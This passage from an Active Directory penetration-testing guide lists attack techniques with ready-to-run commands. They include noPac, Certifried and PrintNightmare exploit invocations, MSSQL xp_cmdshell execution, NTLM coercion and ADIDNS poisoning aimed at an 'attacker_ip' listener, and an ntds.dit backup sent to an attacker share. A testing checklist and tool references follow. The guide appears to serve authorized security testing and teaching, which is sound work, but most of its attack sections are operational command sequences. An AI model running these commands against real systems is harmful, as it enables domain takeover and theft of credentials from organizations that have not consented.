wbadmin start backup -backuptarget:\\attacker\share -include:C:\Windows\NTDS\ntds.dit -quiet

# Or use diskshadow + robocopy to extract
```

### 5. noPac / sAMAccountName Spoofing (CVE-2021-42278 + CVE-2021-42287)

Create a machine account, rename it to match the DC's sAMAccountName (without the $), request a TGT, rename back, then request a service ticket — KDC issues it for the DC.

```
# Using noPac.py
python3 noPac.py corp.local/user1:'Pass123' -dc-ip dc1.corp.local -dc-host dc1 --impersonate administrator -dump
```

**Status:** Patched November 2021. Check if KB5008602 and KB5008380 are installed.

### 6. Certifried (CVE-2022-26923)

Any domain user can create a machine account and set its dNSHostName to match a DC, then request a certificate that authenticates as the DC.

```
certipy account create -u user1@corp.local -p 'Pass123' -user 'EVIL$' -dns dc1.corp.local
certipy req -u 'EVIL$@corp.local' -p 'EvilPass' -target ca.corp.local -ca 'CORP-CA' -template Machine
certipy auth -pfx dc1.pfx -dc-ip 10.0.0.1
```

**Status:** Patched May 2022. Check if KB5014754 is installed.

### 7. GPO Misconfigurations

```powershell
# Export all GPOs to HTML for review
Import-Module GroupPolicy
Get-GPOReport -All -ReportType HTML -Path AllGPOs.html
```

Common issues to look for:
- "Allow log on locally" granted to Everyone or Domain Users.
- Unrestricted PowerShell execution policy.
- Unencrypted GPP (Group Policy Preferences) passwords (legacy but still found).
- Weak User Rights Assignments.

**GPP Passwords (legacy — fixed in MS14-025 but old GPOs may remain):**

```
# Search SYSVOL for cpassword
findstr /S /I cpassword \\corp.local\sysvol\corp.local\policies\*.xml

# Decrypt with gpp-decrypt
gpp-decrypt <encrypted_string>
```

### 8. LDAP Signing & Channel Binding Status

Critical for determining if relay attacks work.

```
# Check with NetExec
nxc ldap dc1.corp.local -u user1 -p 'Pass123' -M ldap-checker
```

Output shows whether LDAP signing is enforced and channel binding is required.

### 9. Security Controls Check

```powershell
# Check if Windows Defender is running
Get-MpComputerStatus | Select RealTimeProtectionEnabled, AMServiceEnabled

# Check AppLocker policies
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections

# Check Credential Guard
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard

# Check AMSI status
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
```

### 10. MSSQL Server Attacks

MSSQL servers in AD environments often run as domain service accounts with high privileges. Compromising MSSQL can lead directly to domain compromise.

**Discovery:**

```
# Find MSSQL servers via SPN
nxc mssql 10.0.0.0/24
impacket-GetUserSPNs -dc-ip dc1.corp.local corp.local/user1:'Pass123' | grep MSSQL

# LDAP
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
  "(&(objectCategory=person)(servicePrincipalName=MSSQL*))" sAMAccountName servicePrincipalName
```

**Authentication:**

```
# Password auth
nxc mssql sql-srv.corp.local -u user1 -p 'Pass123' -d corp.local

# SA local auth
nxc mssql sql-srv.corp.local -u sa -p 'DbP@ss!' --local-auth

# Impacket
impacket-mssqlclient corp.local/user1:'Pass123'@sql-srv.corp.local -windows-auth
```

**Command execution via xp_cmdshell:**

```
# Enable and execute (requires sysadmin role)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# Or via nxc (handles enable/disable automatically)
nxc mssql sql-srv.corp.local -u sa -p 'DbP@ss!' --local-auth -x "whoami"
```

**NTLM coercion via xp_dirtree (force MSSQL service account to authenticate to you):**

```
# On MSSQL
EXEC master..xp_dirtree '\\attacker_ip\share\test';

# Capture with Responder or relay with ntlmrelayx
responder -I eth0 -v
```

**Linked Servers (pivot across MSSQL instances, even cross-forest):**

```
# Enumerate linked servers
SELECT * FROM sys.servers WHERE is_linked = 1;

# Execute on linked server
EXEC ('xp_cmdshell ''whoami'';') AT [LINKED-SRV];

# Crawl all linked servers (PowerUpSQL)
Get-SQLServerLinkCrawl -Instance sql-srv.corp.local -Verbose
```

**Impersonation (escalate within MSSQL):**

```
# Find impersonatable logins
SELECT distinct b.name FROM sys.server_permissions a
  INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE';

# Impersonate
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell 'whoami';
```

### 11. Pre-Created / Pre-2K Computer Accounts

Computer accounts created before Windows 2000 (or with "Assign this computer account as a pre-Windows 2000 computer" checked) have a default password that is the lowercase hostname (without the `$`).

```
# Find pre-2K accounts via nxc
nxc ldap dc1.corp.local -u user1 -p 'Pass123' -M pre2k

# Authenticate as the machine account
nxc smb dc1.corp.local -u 'OLDPC$' -p 'oldpc'
```

If successful, you have a machine account — use it for RBCD attacks or S4U delegation.

### 12. ADIDNS Poisoning

AD-Integrated DNS allows any authenticated user to create new DNS records. Inject records pointing to your IP to intercept traffic.

```
# Using dnstool.py (Krbrelayx)
python3 dnstool.py -u 'corp.local\user1' -p 'Pass123' -a add \
  -r 'evilhost.corp.local' -d attacker_ip dc1.corp.local

# Using Invoke-DNSUpdate (PowerShell)
Invoke-DNSUpdate -DNSType A -DNSName evilhost.corp.local -DNSData attacker_ip
```

Creates a DNS record for `evilhost.corp.local` → your IP. Combine with Responder for credential capture when clients resolve this name.

**Wildcard record (catch all failed DNS lookups):**

```
python3 dnstool.py -u 'corp.local\user1' -p 'Pass123' -a add \
  -r '*.corp.local' -d attacker_ip dc1.corp.local
```

### 13. WebDAV / WebClient Coercion

When the WebClient service is running on a target, you can coerce HTTP-based NTLM authentication (instead of SMB). This bypasses SMB signing requirements since the auth goes over HTTP.

**Check for WebClient service:**

```
nxc smb 10.0.0.0/24 -u user1 -p 'Pass123' -M webdav
```

**Coerce via WebDAV (requires WebClient running on target):**

```
# PetitPotam over HTTP (bypasses SMB signing)
python3 PetitPotam.py -u user1 -p 'Pass123' -d corp.local attacker@80/test target_ip

# Use SearchConnector or .url/.lnk files in writable shares to trigger WebClient
```

Key insight: WebDAV coercion sends auth over HTTP → you can relay it to LDAP (for RBCD or shadow credentials) even when SMB signing is enforced.

### 14. Coercer (All-in-One Coercion Tool)

Instead of running PetitPotam, PrinterBug, DFSCoerce, and ShadowCoerce separately, use Coercer to try all methods:

```
# Try all coercion methods
python3 Coercer.py coerce -u user1 -p 'Pass123' -d corp.local \
  --target-ip dc1.corp.local --listener-ip attacker_ip

# List available methods
python3 Coercer.py scan -u user1 -p 'Pass123' -d corp.local --target-ip dc1.corp.local

# Specific method
python3 Coercer.py coerce -u user1 -p 'Pass123' -d corp.local \
  --target-ip dc1.corp.local --listener-ip attacker_ip --filter-method-name PetitPotam
```

### 15. PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

Remote code execution via the Print Spooler service. Allows any authenticated user to execute code as SYSTEM on targets with Print Spooler running.

```
# Check if vulnerable
rpcdump.py @dc1.corp.local | grep -i spoolsv

# Exploit (DLL must be hosted on attacker SMB share)
python3 CVE-2021-1675.py corp.local/user1:'Pass123'@dc1.corp.local '\\attacker_ip\share\evil.dll'
```

**Status:** Patched July 2021. Still commonly found unpatched on internal networks. Check for MS patches KB5004945, KB5004947.

### 16. SCCM / MECM (Microsoft Endpoint Configuration Manager)

SCCM/MECM manages software deployment across the domain. Misconfigurations grant paths to domain compromise.

**Discovery:**

```
# Find SCCM servers via SPN
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
  "(servicePrincipalName=*SMS*)" sAMAccountName servicePrincipalName

# Find SCCM via DNS
nslookup -type=SRV _mssms_mp._tcp.corp.local
```

**SharpSCCM (enumeration and exploitation):**

```
# Enumerate SCCM site info
SharpSCCM.exe local site-info

# Get SCCM credentials (NAA — Network Access Account)
SharpSCCM.exe local secrets -m wmi

# Execute on SCCM clients (if admin on SCCM)
SharpSCCM.exe exec -d TargetPC -p "C:\Windows\System32\cmd.exe" -r "/c whoami > C:\temp\out.txt"
```

**sccmhunter (Python — remote enumeration):**

```
python3 sccmhunter.py smb -u user1 -p 'Pass123' -d corp.local -dc-ip 10.0.0.1 -target sccm-srv.corp.local
```

Common SCCM attack paths: extract Network Access Account credentials, abuse client push installation (NTLM relay), deploy malicious applications to targets.

## Module 15: Testing Checklist

### Reconnaissance & Enumeration
- [ ] Anonymous LDAP bind test
- [ ] Null session SMB enumeration (shares, users, RID brute)
- [ ] enum4linux-ng scan
- [ ] Domain/forest/DC enumeration
- [ ] Full user enumeration (adminCount, UAC flags, descriptions)
- [ ] Group enumeration (Domain Admins, Enterprise Admins, built-in groups)
- [ ] Recursive group membership mapping
- [ ] Service account (SPN) enumeration
- [ ] AS-REP roastable account enumeration
- [ ] Computer enumeration (OS versions, delegation flags)
- [ ] GMSA enumeration and password extraction
- [ ] LAPS enumeration and password retrieval
- [ ] Trust relationship mapping
- [ ] BloodHound/SharpHound data collection and analysis (or nxc --bloodhound)
- [ ] ACL enumeration (shadow admin paths, nxc -M daclread)
- [ ] GPO review for misconfigurations
- [ ] AD CS enumeration (Certipy find -vulnerable, nxc -M adcs)
- [ ] MachineAccountQuota check (nxc -M maq)
- [ ] LDAP signing and channel binding status (nxc -M ldap-checker)
- [ ] SMB signing status across network (nxc --gen-relay-list)
- [ ] Stale computer accounts (90+ days inactive)
- [ ] Pre-2K computer accounts (nxc -M pre2k)
- [ ] Password policy and FGPP review
- [ ] WebClient service detection (nxc -M webdav)
- [ ] Share spidering for sensitive files (nxc -M spider_plus)
- [ ] MSSQL server discovery and enumeration
- [ ] SCCM/MECM discovery and enumeration
- [ ] ADIDNS record enumeration

### Credential Attacks
- [ ] LLMNR/NBT-NS poisoning (Responder/Inveigh)
- [ ] ADIDNS poisoning (wildcard record injection)
- [ ] Password spraying (below lockout threshold, nxc ldap/smb/kerberos)
- [ ] Kerberoasting (nxc --kerberoasting or Impacket/Rubeus)
- [ ] AS-REP Roasting (nxc --asreproast or Impacket/Rubeus)
- [ ] GPP password extraction (nxc -M gpp_password)
- [ ] LSASS credential extraction (nxc -M lsassy / nanodump)
- [ ] SAM/LSA dump (nxc --sam --lsa)
- [ ] NTDS.dit dump (nxc --ntds or secretsdump)
- [ ] DPAPI credential extraction (nxc --dpapi)
- [ ] Cached domain credential extraction
- [ ] Pre-2K computer account default password test

### NTLM Coercion & Relay
- [ ] PetitPotam coercion test
- [ ] PrinterBug / SpoolSample coercion test
- [ ] DFSCoerce test
- [ ] ShadowCoerce test
- [ ] WebDAV / HTTP coercion (bypasses SMB signing)
- [ ] MSSQL coercion via xp_dirtree
- [ ] Coercer (all-in-one — tries all methods)
- [ ] NTLM relay to SMB (signing disabled targets)
- [ ] NTLM relay to LDAP (signing not enforced)
- [ ] NTLM relay to AD CS web enrollment (ESC8)
- [ ] NTLM relay to AD CS RPC enrollment (ESC11)
- [ ] NTLM relay to LDAP + RBCD chain
- [ ] NTLM relay to LDAP + Shadow Credentials chain

### Kerberos Attacks
- [ ] Golden Ticket (if krbtgt hash obtained)
- [ ] Silver Ticket (if service account hash obtained)
- [ ] Diamond Ticket
- [ ] Pass-the-Ticket
- [ ] Over-Pass-the-Hash
- [ ] S4U abuse (constrained delegation)

### Delegation Attacks
- [ ] Unconstrained delegation exploitation
- [ ] Constrained delegation S4U abuse
- [ ] RBCD attack (MachineAccountQuota + write access)
- [ ] Printer Bug + unconstrained delegation chain

### AD CS Attacks
- [ ] ESC1 — Enrollee supplies subject
- [ ] ESC4 — Template ACL misconfiguration
- [ ] ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
- [ ] ESC7 — ManageCA / ManageCertificates abuse
- [ ] ESC8 — Relay to HTTP enrollment
- [ ] ESC11 — Relay to RPC enrollment
- [ ] ESC13 — OID group link
- [ ] Certificate-based persistence
- [ ] UnPAC-the-Hash

### ACL & Replication Abuse
- [ ] GenericAll / GenericWrite / WriteDacl abuse
- [ ] ForceChangePassword abuse
- [ ] Shadow Credentials (Whisker/pyWhisker)
- [ ] DCSync
- [ ] AdminSDHolder backdoor test
- [ ] DCShadow (if in-scope)

### Lateral Movement
- [ ] Pass-the-Hash
- [ ] WinRM / PSRemoting
- [ ] PSExec / SMBExec / WMIExec
- [ ] DCOM execution
- [ ] SMB share enumeration and access

### Trust Attacks
- [ ] Child → Parent Golden Ticket with EA SID
- [ ] Cross-forest Kerberoasting
- [ ] SID filtering verification
- [ ] Cross-trust resource enumeration

### Privilege Escalation
- [ ] Token impersonation (SeImpersonatePrivilege)
- [ ] DnsAdmins DLL loading
- [ ] Backup Operators abuse
- [ ] noPac / sAMAccountName spoofing (if unpatched)
- [ ] Certifried (if unpatched)
- [ ] PrintNightmare (CVE-2021-1675 / CVE-2021-34527 — if unpatched)
- [ ] PrintSpoofer / GodPotato (service account → SYSTEM)
- [ ] MSSQL xp_cmdshell (if sysadmin)
- [ ] MSSQL linked server crawling
- [ ] MSSQL impersonation (EXECUTE AS LOGIN)
- [ ] SCCM credential extraction (NAA secrets)
- [ ] SCCM client push abuse

### Persistence (Document for Report — Clean Up After)
- [ ] Golden/Silver/Diamond Ticket
- [ ] Certificate-based persistence
- [ ] Shadow Credentials
- [ ] AdminSDHolder ACE
- [ ] SID History injection
- [ ] GPO backdoor

## References & Resources

### Frameworks & Standards
- OWASP Thick Client Application Security Verification Standard (TASVS v1.8): https://owasp.org/www-project-thick-client-application-security-verification-standard/
- MITRE ATT&CK — Active Directory: https://attack.mitre.org/techniques/T1087/002/

### Core Tools
- **Impacket**: https://github.com/fortra/impacket — Python AD attack toolkit (secretsdump, GetUserSPNs, ntlmrelayx, etc.)
- **NetExec (nxc)**: https://github.com/Pennyw0rth/NetExec — Successor to CrackMapExec. Network service exploitation.
- **Certipy**: https://github.com/ly4k/Certipy — AD CS enumeration and exploitation (ESC1-ESC16).
- **Rubeus**: https://github.com/GhostPack/Rubeus — C# Kerberos abuse toolkit.
- **Mimikatz**: https://github.com/gentilkiwi/mimikatz — Credential extraction and Kerberos manipulation.
- **BloodHound CE**: https://github.com/SpecterOps/BloodHound — AD attack path visualization.
- **SharpHound**: https://github.com/BloodHoundAD/SharpHound — BloodHound data collector.
- **PowerView**: https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1 — PowerShell AD enumeration.
- **Whisker**: https://github.com/eladshamir/Whisker — Shadow Credentials (C#).
- **pyWhisker**: https://github.com/ShutdownRepo/pywhisker — Shadow Credentials (Python).
- **Responder**: https://github.com/lgandx/Responder — LLMNR/NBT-NS/mDNS poisoner.
- **Kerbrute**: https://github.com/ropnop/kerbrute — Kerberos username enumeration and password spraying.
- **PKINITtools**: https://github.com/dirkjanm/PKINITtools — PKINIT exploitation tools.
- **Certify 2.0**: https://github.com/GhostPack/Certify — C# AD CS enumeration.

### Coercion Tools
- **PetitPotam**: https://github.com/topotam/PetitPotam
- **PrinterBug / SpoolSample**: https://github.com/leechristensen/SpoolSample
- **DFSCoerce**: https://github.com/Wh04m1001/DFSCoerce
- **ShadowCoerce**: https://github.com/ShutdownRepo/ShadowCoerce
- **Coercer** (all-in-one): https://github.com/p0dalirius/Coercer

### MSSQL & SCCM Tools
- **PowerUpSQL**: https://github.com/NetSPI/PowerUpSQL — MSSQL discovery, enumeration, and exploitation.
- **Impacket mssqlclient**: Part of Impacket — MSSQL interactive client.
- **SharpSCCM**: https://github.com/Mayyhem/SharpSCCM — SCCM enumeration and exploitation.
- **sccmhunter**: https://github.com/garrettfoster13/sccmhunter — SCCM attack toolkit.

### Additional Tools
- **enum4linux-ng**: https://github.com/cddmp/enum4linux-ng — SMB/RPC enumeration.
- **Inveigh**: https://github.com/Kevin-Robertson/Inveigh — Windows LLMNR/NBNS/mDNS poisoner.
- **dnstool.py** (Krbrelayx): https://github.com/dirkjanm/krbrelayx — ADIDNS manipulation.
- **DomainPasswordSpray**: https://github.com/dafthack/DomainPasswordSpray — PowerShell password spraying.
- **gMSADumper**: https://github.com/micahvandeusen/gMSADumper — Extract GMSA passwords.
- **PrintNightmare PoC**: https://github.com/cube0x0/CVE-2021-1675
- **noPac PoC**: https://github.com/Ridter/noPac
- **GodPotato**: https://github.com/BeichenDream/GodPotato — SeImpersonatePrivilege escalation.

### Research & Methodology
- Certified Pre-Owned (AD CS whitepaper): https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
- Shadow Credentials (SpecterOps): https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
- The Hacker Recipes (comprehensive reference): https://www.thehacker.recipes/
- InternalAllTheThings: https://swisskyrepo.github.io/InternalAllTheThings/
- HackTricks AD Methodology: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- adsecurity.org (Sean Metcalf): https://adsecurity.org/

### Practice Labs
- DVAD (Damn Vulnerable Active Directory): https://github.com/WazeHell/vulnerable-AD
- GOAD (Game of Active Directory): https://github.com/Orange-Cyberdefense/GOAD
- Vulnerable-AD: https://github.com/safebuffer/vulnerable-AD
